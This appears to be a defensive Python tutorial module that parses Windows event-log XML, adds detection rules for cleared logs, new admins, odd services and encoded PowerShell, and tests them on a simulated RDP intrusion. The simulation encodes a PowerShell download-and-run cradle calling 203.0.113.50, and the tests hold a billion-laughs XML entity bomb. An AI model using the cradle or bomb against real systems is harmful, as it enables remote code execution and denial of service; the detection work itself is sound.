# Windows Event Logs: one more parser, and the rules that go with it
#
# Windows records security activity as numbered EVENTS in XML. This file
# adds a WindowsEventParser (a LogParser subclass, parsers.py) that
# turns them into LogEvents (events.py), plus rules for the
# Windows events attackers can't avoid creating.
#
# Because everything shares the LogEvent format, rules that already
# exist work on Windows with NO changes: BruteForceRule catches RDP
# brute force, NewSourceIPRule and the baseline rules work on Windows
# logons, and the Correlator builds incidents across Windows and Linux.
# That's the payoff of one shared event format.
#
# Topics covered here:
#   1. What a Windows event looks like, and where to get them
#   2. The event IDs that matter most for security
#   3. Parsing XML safely with xml.etree.ElementTree (namespaces,
#      EventData vs UserData, and why untrusted XML needs care)
#   4. The parser
#   5. Windows rules: cleared logs, new admins, suspicious services,
#      encoded PowerShell (decoding it, with base64 and UTF-16)
#   6. A full RDP intrusion, from first failed logon to cleared logs,
#      correlated into an incident
#   7. Practice, with tests
#
# GETTING REAL EVENTS (on Windows, as an administrator)
# -----------------------------------------------------
#   wevtutil qe Security /c:500 /rd:true /f:xml > security.xml
#   wevtutil qe System   /c:500 /rd:true /f:xml > system.xml
# wevtutil writes each <Event> on its own line, which is what this
# parser reads. Saved .evtx files are a binary format; the third-party
# `python-evtx` package can read those. Many teams instead ship events
# as JSON with Winlogbeat or the Azure Monitor agent; that would be a
# small JSON parser like CloudTrailParser.


import base64
import re
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone

from . import correlation
from .correlation import Correlator, all_rules
from .events import LogEvent
from .parsers import LogParser, ParseError, detect_parser
from .rules import DetectionEngine, Rule, Severity, Timeline


# ---------------------------------------------------------------
# 1. What an event looks like
# ---------------------------------------------------------------
#
# Every event has a <System> part (the same for all events) and an
# <EventData> part (different fields for each event ID):
#
#   <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
#     <System>
#       <Provider Name="Microsoft-Windows-Security-Auditing" />
#       <EventID>4625</EventID>
#       <TimeCreated SystemTime="2026-11-27T10:15:32.1234567Z" />
#       <Computer>WS17.corp.example</Computer>
#     </System>
#     <EventData>
#       <Data Name="TargetUserName">administrator</Data>
#       <Data Name="LogonType">10</Data>
#       <Data Name="IpAddress">198.51.100.23</Data>
#       <Data Name="Status">0xc000006d</Data>
#       <Data Name="SubStatus">0xc000006a</Data>
#     </EventData>
#   </Event>
#
# A few events (like 1102, log cleared) put their fields in <UserData>
# instead, one level deeper. The parser handles both.


# ---------------------------------------------------------------
# 2. Event IDs that matter most
# ---------------------------------------------------------------
#
#   ID    | log      | meaning                              | why it matters
#   ------|----------|--------------------------------------|-------------------------------
#   4624  | Security | successful logon                     | who got in, how, from where
#   4625  | Security | failed logon                         | password guessing
#   4672  | Security | special privileges at logon (admin)  | an admin session started
#   4688  | Security | new process (needs auditing enabled) | what was RUN, with command line
#   4720  | Security | user account created                 | attackers make backdoor accounts
#   4728  | Security | member added to a global group       | e.g. "Domain Admins"
#   4732  | Security | member added to a local group        | e.g. "Administrators"
#   4740  | Security | account locked out                   | guessing hit the limit
#   1102  | Security | the audit log was cleared            | covering tracks
#   7045  | System   | a new service was installed          | a favourite way to persist
#
# Logon types (in 4624/4625) say HOW someone logged on:
#   2 at the keyboard, 3 over the network (file shares), 5 as a service,
#   7 unlocking the screen, 10 Remote Desktop (RDP), 11 cached credentials

LOGON_TYPES = {"2": "interactive", "3": "network", "4": "batch", "5": "service",
               "7": "unlock", "8": "network-cleartext", "9": "new-credentials",
               "10": "remote-desktop", "11": "cached"}

FAILURE_REASONS = {                                   # Status / SubStatus in 4625
    "0xc000006a": "wrong password",
    "0xc0000064": "no such user",
    "0xc0000234": "account locked",
    "0xc0000072": "account disabled",
    "0xc000006f": "outside allowed hours",
    "0xc0000071": "password expired",
}

ACTIONS = {
    4624: "login", 4625: "login", 4672: "privileged_logon", 4688: "process_created",
    4720: "account_created", 4728: "group_member_added", 4732: "group_member_added",
    4756: "group_member_added", 4740: "account_locked", 1102: "log_cleared",
    7045: "service_installed",
}


# ---------------------------------------------------------------
# 3. Parsing XML safely
# ---------------------------------------------------------------
#
# NAMESPACES: the xmlns="..." on <Event> means every tag's real name is
# "{http://schemas.microsoft.com/...}EventID". find() needs that prefix,
# so pass a namespace map: root.find("e:System/e:EventID", NS).
#
# UNTRUSTED XML: XML can define ENTITIES that expand into other
# entities. A few hundred bytes can expand into gigabytes (the
# "billion laughs" attack, a cousin of the decompression bomb in
# decode_string.py), and external entities can make a parser read
# local files (XXE). Python's parser refuses external entities and
# modern expat limits expansion, but for XML from outside, the safe
# habit is the `defusedxml` package (`pip install defusedxml`), which
# is a drop-in replacement. Real Windows events never contain a DTD,
# so this parser also simply rejects any line that declares one.

NS = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
DTD = re.compile(r"<!(DOCTYPE|ENTITY)", re.IGNORECASE)


def event_fields(root):
    """Return the name -> value fields from EventData or UserData."""
    fields = {}
    data = root.find("e:EventData", NS)
    if data is not None:
        for item in data.findall("e:Data", NS):
            fields[item.get("Name")] = (item.text or "").strip()
    user_data = root.find("e:UserData", NS)
    if user_data is not None:
        for wrapper in user_data:                     # e.g. <LogFileCleared>
            for child in wrapper:
                fields[child.tag.split("}")[-1]] = (child.text or "").strip()
    return fields


def blank_to_none(value):
    return None if value in (None, "", "-") else value


# ---------------------------------------------------------------
# 4. The parser
# ---------------------------------------------------------------
#
# Defining the class is enough: __init_subclass__ in LogParser
# registers it, so detect_parser() recognises Windows XML from now on.

class WindowsEventParser(LogParser):
    name = "windows-xml"

    @classmethod
    def looks_like(cls, line):
        return line.lstrip().startswith("<Event") and "schemas.microsoft.com/win" in line

    def parse_line(self, line):
        if DTD.search(line):
            raise ParseError("refusing XML with a DTD or entity declaration")
        try:
            root = ET.fromstring(line)
            system = root.find("e:System", NS)
            event_id = int(system.find("e:EventID", NS).text)
            when = datetime.fromisoformat(system.find("e:TimeCreated", NS).get("SystemTime"))
            computer = system.find("e:Computer", NS).text
        except (ET.ParseError, AttributeError, TypeError, ValueError) as err:
            raise ParseError(f"bad Windows event XML: {err}")

        action = ACTIONS.get(event_id)
        if action is None:
            return None                               # an event we don't use
        f = event_fields(root)
        detail = {"event_id": event_id}
        user = blank_to_none(f.get("TargetUserName"))
        outcome = "success"

        if event_id in (4624, 4625):
            detail["logon_type"] = LOGON_TYPES.get(f.get("LogonType"), f.get("LogonType"))
            detail["workstation"] = blank_to_none(f.get("WorkstationName"))
            if event_id == 4625:
                outcome = "failure"
                code = (f.get("SubStatus") or "").lower()
                if code in ("", "0x0"):
                    code = (f.get("Status") or "").lower()
                detail["reason"] = FAILURE_REASONS.get(code, code)
        elif event_id in (4720, 4728, 4732, 4756):
            user = blank_to_none(f.get("SubjectUserName"))         # who DID it
            detail["target"] = blank_to_none(f.get("MemberName") or f.get("TargetUserName"))
            if event_id != 4720:
                detail["group"] = f.get("TargetUserName")
        elif event_id == 4688:
            user = blank_to_none(f.get("SubjectUserName"))
            detail["process"] = f.get("NewProcessName", "")
            detail["command_line"] = f.get("CommandLine", "")
            detail["parent"] = f.get("ParentProcessName", "")
        elif event_id == 4672:
            user = blank_to_none(f.get("SubjectUserName"))
        elif event_id == 1102:
            user = blank_to_none(f.get("SubjectUserName"))
        elif event_id == 7045:
            user = None                                # the System log doesn't say who
            detail["service"] = f.get("ServiceName", "")
            detail["image_path"] = f.get("ImagePath", "")
            detail["run_as"] = f.get("AccountName", "")

        ip = blank_to_none(f.get("IpAddress"))
        if ip in ("::1", "127.0.0.1"):
            ip = None                                  # local, not a remote source
        return LogEvent(time=when.astimezone(timezone.utc), source="windows", action=action,
                        outcome=outcome, user=user, src_ip=ip, host=computer, detail=detail)


# ---------------------------------------------------------------
# 5. Windows rules
# ---------------------------------------------------------------

class LogClearedRule(Rule):
    name = "log-cleared"
    severity = Severity.HIGH

    def process(self, event):
        if event.source == "windows" and event.action == "log_cleared":
            return [self.alert(event, f"{event.user} cleared the Security log on {event.host}")]
        return []


class NewAdminRule(Rule):
    """New accounts, and anyone added to an admin group."""
    name = "new-admin"
    severity = Severity.HIGH

    ADMIN_GROUPS = {"administrators", "domain admins", "enterprise admins", "schema admins"}

    def process(self, event):
        if event.source != "windows":
            return []
        if event.action == "account_created":
            return [self.alert(event, f"{event.user} created account {event.detail['target']!r} "
                                      f"on {event.host}", Severity.MEDIUM)]
        if event.action == "group_member_added" and \
                (event.detail.get("group") or "").lower() in self.ADMIN_GROUPS:
            return [self.alert(event, f"{event.user} added {event.detail['target']!r} to "
                                      f"{event.detail['group']} on {event.host}")]
        return []


class SuspiciousServiceRule(Rule):
    """A new service whose program lives somewhere services normally don't,
    or that runs a shell. Real services live under C:\\Windows or C:\\Program Files."""
    name = "suspicious-service"
    severity = Severity.HIGH

    ODD = re.compile(r"\\(users|temp|programdata|appdata|perflogs)\\|powershell|cmd(\.exe)? /c"
                     r"|\\\\[^\\]+\\|rundll32", re.IGNORECASE)

    def process(self, event):
        if event.source == "windows" and event.action == "service_installed":
            path = event.detail.get("image_path", "")
            if self.ODD.search(path):
                return [self.alert(event, f"service {event.detail['service']!r} installed on "
                                          f"{event.host} running {path}")]
        return []


# Encoded PowerShell: -EncodedCommand (or any abbreviation down to -e)
# takes Base64 of the command in UTF-16LE (two bytes per character),
# NOT UTF-8. Decoding it shows what was really run.

ENCODED = re.compile(r"powershell(?:\.exe)?\b.*?\s-e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?"
                     r"\s+(?P<b64>[A-Za-z0-9+/=]{8,})", re.IGNORECASE)


def decode_powershell(b64):
    try:
        return base64.b64decode(b64, validate=True).decode("utf-16-le")
    except (ValueError, UnicodeDecodeError):
        return None


class EncodedPowerShellRule(Rule):
    name = "encoded-powershell"
    severity = Severity.HIGH

    def process(self, event):
        if event.action != "process_created":
            return []
        m = ENCODED.search(event.detail.get("command_line", ""))
        if not m:
            return []
        decoded = decode_powershell(m["b64"])
        shown = decoded if decoded is not None else "(could not decode)"
        return [self.alert(event, f"{event.user} ran encoded PowerShell on {event.host}: {shown}")]


def windows_rules():
    return [LogClearedRule(), NewAdminRule(), SuspiciousServiceRule(), EncodedPowerShellRule()]


# Teach the Correlator what these rules mean in ATT&CK terms.
correlation.ATTACK.update({
    "log-cleared":        ("T1070.001", "Defense Evasion", "Indicator Removal: Clear Windows Event Logs"),
    "new-admin":          ("T1098", "Persistence", "Account Manipulation"),
    "suspicious-service": ("T1543.003", "Persistence", "Create or Modify System Process: Windows Service"),
    "encoded-powershell": ("T1059.001", "Execution", "Command and Scripting Interpreter: PowerShell"),
})


# ---------------------------------------------------------------
# 6. A full RDP intrusion
# ---------------------------------------------------------------
#
# Builds event XML the way wevtutil writes it (one event per line).

def event_xml(event_id, when, data=None, computer="WS17.corp.example", user_data=None,
              provider="Microsoft-Windows-Security-Auditing"):
    fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in (data or {}).items())
    body = f"<EventData>{fields}</EventData>" if data is not None else ""
    if user_data:
        inner = "".join(f"<{k}>{v}</{k}>" for k, v in user_data.items())
        body += f'<UserData><LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">{inner}</LogFileCleared></UserData>'
    stamp = when.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"     # 7 digits, like Windows
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
            f'<Provider Name="{provider}"/><EventID>{event_id}</EventID>'
            f'<TimeCreated SystemTime="{stamp}"/><Computer>{computer}</Computer></System>{body}</Event>')


def rdp_intrusion(start=datetime(2026, 11, 27, 2, 10, tzinfo=timezone.utc)):
    attacker = "198.51.100.23"
    t = lambda seconds: start + timedelta(seconds=seconds)
    lines = []
    for i, user in enumerate(["administrator", "admin", "administrator", "user", "administrator",
                              "administrator", "test", "administrator"]):
        sub = "0xc0000064" if user in ("admin", "user", "test") else "0xc000006a"
        lines.append(event_xml(4625, t(i * 5), {
            "TargetUserName": user, "LogonType": "10", "IpAddress": attacker,
            "WorkstationName": "kali", "Status": "0xc000006d", "SubStatus": sub}))
    lines.append(event_xml(4624, t(60), {"TargetUserName": "administrator", "LogonType": "10",
                                         "IpAddress": attacker, "WorkstationName": "kali"}))
    lines.append(event_xml(4672, t(61), {"SubjectUserName": "administrator"}))
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')"
                               .encode("utf-16-le")).decode()
    lines.append(event_xml(4688, t(120), {
        "SubjectUserName": "administrator", "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": f"powershell.exe -nop -w hidden -enc {payload}",
        "ParentProcessName": r"C:\Windows\explorer.exe"}))
    lines.append(event_xml(4720, t(180), {"SubjectUserName": "administrator", "TargetUserName": "svc-update"}))
    lines.append(event_xml(4732, t(185), {"SubjectUserName": "administrator", "MemberName": "svc-update",
                                          "TargetUserName": "Administrators"}))
    lines.append(event_xml(7045, t(240), {"ServiceName": "WinUpdateHelper",
                                          "ImagePath": r"C:\Users\Public\updater.exe",
                                          "AccountName": "LocalSystem"},
                           provider="Service Control Manager"))
    lines.append(event_xml(4624, t(300), {"TargetUserName": "svc-backup", "LogonType": "5",
                                          "IpAddress": "-"}))                     # routine noise
    lines.append(event_xml(5379, t(301), {"SubjectUserName": "administrator"}))   # an ID we skip
    lines.append(event_xml(1102, t(330), user_data={"SubjectUserName": "administrator"},
                           provider="Microsoft-Windows-Eventlog"))
    return lines


def section_6():
    lines = rdp_intrusion()
    parser = detect_parser(lines)
    events = Timeline(parser.parse(lines))
    print(f"  detected {parser.name!r}: {parser}")
    for e in events:
        extra = e.detail.get("logon_type") or e.detail.get("reason") or e.detail.get("service") \
            or e.detail.get("target") or ""
        print(f"    {e.time:%H:%M:%S} {e.detail['event_id']} {e.action:<19} {e.outcome:<8} "
              f"user={e.user} ip={e.src_ip} {extra}")

    alerts = DetectionEngine(all_rules() + windows_rules()).run(events)
    incidents = Correlator().correlate(alerts)
    print(f"\n  {len(alerts)} alerts -> {len(incidents)} incidents\n")
    for incident in incidents:
        print("  " + incident.report().replace("\n", "\n  "))
        print()


# ---------------------------------------------------------------
# 7. Practice and tests
# ---------------------------------------------------------------
#
# Practice: add 4740 (account locked out) to a rule: a lockout of an
# ADMIN account (name contains "admin") is HIGH, any other is LOW.
# Solution: AccountLockoutRule below.

class AccountLockoutRule(Rule):
    name = "account-lockout"
    severity = Severity.LOW

    def process(self, event):
        if event.source == "windows" and event.action == "account_locked":
            severity = Severity.HIGH if "admin" in (event.user or "").lower() else Severity.LOW
            return [self.alert(event, f"{event.user} was locked out on {event.host}", severity)]
        return []


def run_tests():
    lines = rdp_intrusion()
    parser = WindowsEventParser()
    events = list(parser.parse(lines))

    # Detection and parsing
    assert detect_parser(lines).name == "windows-xml"
    assert len(events) == len(lines) - 1                       # 5379 is skipped
    assert parser.error_count == 0
    first = events[0]
    assert (first.action, first.outcome, first.user, first.src_ip) == \
        ("login", "failure", "administrator", "198.51.100.23")
    assert first.detail["logon_type"] == "remote-desktop" and first.detail["reason"] == "wrong password"
    assert events[1].detail["reason"] == "no such user"
    assert first.time == datetime(2026, 11, 27, 2, 10, tzinfo=timezone.utc)
    assert first.host == "WS17.corp.example"

    by_id = {e.detail["event_id"]: e for e in events}
    assert by_id[4732].user == "administrator" and by_id[4732].detail["target"] == "svc-update"
    assert by_id[4732].detail["group"] == "Administrators"
    assert by_id[1102].user == "administrator"                 # from UserData
    assert by_id[7045].detail["image_path"] == r"C:\Users\Public\updater.exe"
    svc = [e for e in events if e.user == "svc-backup"][0]
    assert svc.src_ip is None and svc.detail["logon_type"] == "service"

    # Bad and hostile input
    bomb = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><Event>&lol2;</Event>')
    for bad in (bomb, "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>",
                "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'></Event>"):
        p = WindowsEventParser()
        assert list(p.parse([bad])) == [] and p.error_count == 1, bad
    p = WindowsEventParser()
    list(p.parse([bomb]))
    assert "DTD" in str(p.errors[0])                           # refused before parsing

    # Encoded PowerShell decoding
    encoded = base64.b64encode("whoami /all".encode("utf-16-le")).decode()
    assert decode_powershell(encoded) == "whoami /all"
    assert decode_powershell("not base64!!") is None
    for cmd in (f"powershell -enc {encoded}", f"PowerShell.exe -EncodedCommand {encoded}",
                f"powershell.exe -nop -e {encoded}"):
        assert ENCODED.search(cmd), cmd
    assert not ENCODED.search("powershell.exe -File C:\\scripts\\backup.ps1")

    # Rules
    alerts = DetectionEngine(windows_rules() + all_rules()).run(Timeline(events))
    rules_fired = {a.rule for a in alerts}
    assert {"brute-force", "log-cleared", "new-admin", "suspicious-service",
            "encoded-powershell"} <= rules_fired
    ps = [a for a in alerts if a.rule == "encoded-powershell"][0]
    assert "DownloadString('http://203.0.113.50/a.ps1')" in ps.summary
    assert any(a.severity is Severity.CRITICAL and a.rule == "brute-force" for a in alerts)
    ok_service = WindowsEventParser().parse_line(event_xml(7045, datetime(2026, 1, 1, tzinfo=timezone.utc),
        {"ServiceName": "Spooler", "ImagePath": r"C:\Windows\System32\spoolsv.exe"}))
    assert SuspiciousServiceRule().process(ok_service) == []

    # Correlation: one CRITICAL intrusion; the service install stands alone
    incidents = Correlator().correlate(alerts)
    main = incidents[0]
    assert main.severity is Severity.CRITICAL
    assert {"user:administrator", "ip:198.51.100.23"} <= main.entities
    assert main.tactics[0] == "Credential Access" and "Defense Evasion" in main.tactics
    assert {"T1110", "T1059.001", "T1098", "T1070.001"} <= set(main.techniques)
    lone = [i for i in incidents if any(a.rule == "suspicious-service" for a in i.alerts)][0]
    assert lone is not main and lone.severity >= Severity.MEDIUM

    # Practice
    locked = lambda user: WindowsEventParser().parse_line(
        event_xml(4740, datetime(2026, 1, 1, tzinfo=timezone.utc), {"TargetUserName": user}))
    assert AccountLockoutRule().process(locked("Administrator"))[0].severity is Severity.HIGH
    assert AccountLockoutRule().process(locked("jsmith"))[0].severity is Severity.LOW

    print("All tests passed!")


if __name__ == "__main__":
    print("--- 6. An RDP intrusion, parsed, detected and correlated ---")
    section_6()
    run_tests()
